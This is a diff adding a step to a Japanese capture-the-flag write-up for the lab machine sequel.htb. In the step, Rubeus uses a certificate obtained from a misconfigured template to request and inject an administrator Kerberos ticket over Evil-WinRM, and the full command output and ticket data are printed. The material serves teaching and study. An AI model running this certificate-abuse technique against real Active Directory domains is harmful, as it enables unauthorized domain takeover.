@@ -179,7 +179,88 @@ cert.pemをコピってKaliに持ってくる。そして`.pfx`に変換：
 
 cert.pfxを再度Windowsの方に持ってくる
 
+`cert.pfx`というcertificateを使って、RubeusでadministratorのTGTをリクエストする
 
+```
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
+[*] Using domain controller: fe80::3151:e0f:a1df:26b6%4:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  administrator
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  3/9/2023 11:24:37 AM
+  EndTime                  :  3/9/2023 9:24:37 PM
+  RenewTill                :  3/16/2023 12:24:37 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  wdfnlRJs7ze6zJYxKbZ+pw==
+  ASREP (key)              :  891C23EB2B62161F96314EDF1C501ED0
+```
+
+```
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> klist
+
+Current LogonId is 0:0x34e262
+
+Cached Tickets: (1)
+
+#0>	Client: administrator @ SEQUEL.HTB
+	Server: krbtgt/sequel.htb @ SEQUEL.HTB
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0xe10000 -> renewable initial pre_authent name_canonicalize
+	Start Time: 3/9/2023 11:24:37 (local)
+	End Time:   3/9/2023 21:24:37 (local)
+	Renew Time: 3/16/2023 11:24:37 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0x1 -> PRIMARY
+	Kdc Called:
+```
  
  参考：
  - [From Misconfigured Certificate Template to Domain Admin(Read Team Notes)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
